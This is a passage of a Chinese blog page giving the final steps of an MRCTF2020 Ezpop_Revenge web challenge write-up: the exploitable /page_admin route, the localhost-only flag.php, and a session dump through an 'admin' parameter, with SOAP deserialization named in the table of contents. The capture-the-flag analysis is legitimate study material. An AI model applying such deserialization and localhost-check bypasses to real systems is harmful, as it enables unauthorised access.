+<p>*这句代码的意思大概就是访问<code>/page_admin</code>的时候，会自动加载<code>HelloWorld_Plugin</code>类，而且会自动调用<code>action</code>函数，所以我们利用点的路由为<code>/page_admin</code>*。</p>
+</blockquote>
+<p>最后是文件中带有的flag.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;我扌your problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果是内网访问，则flag写入session，利用点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;admin&#x27;</span>])) var_dump($_SESSION);</span><br></pre></td></tr></table></figure>
+
+<p>传入admin参数打印session获取flag……</p>
+<p><img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404183523393.png" alt="image-20210404183523393"></p>
+<blockquote>
+<p>这题……好像还有很类似的题，大概算是真实环境下的反序列化代码审计？不清楚，我啥都不知道🐕</p>
+<p>经常看了后面忘前面……也算是一种锻炼吧，多积累经验……</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/03/MRCTF2020-Ezpop/" rel="prev" title="MRCTF2020-Ezpop">
+      <i class="fa fa-chevron-left"></i> MRCTF2020-Ezpop
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#MRCTF2020-Ezpop-Revenge"><span class="nav-number">1.</span> <span class="nav-text">[MRCTF2020]Ezpop_Revenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SOAP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.</span> <span class="nav-text">SOAP 反序列化</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="inanb"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">inanb</p>
+  <div class="site-description" itemprop="description">铁马冰河入梦来</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">inanb</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
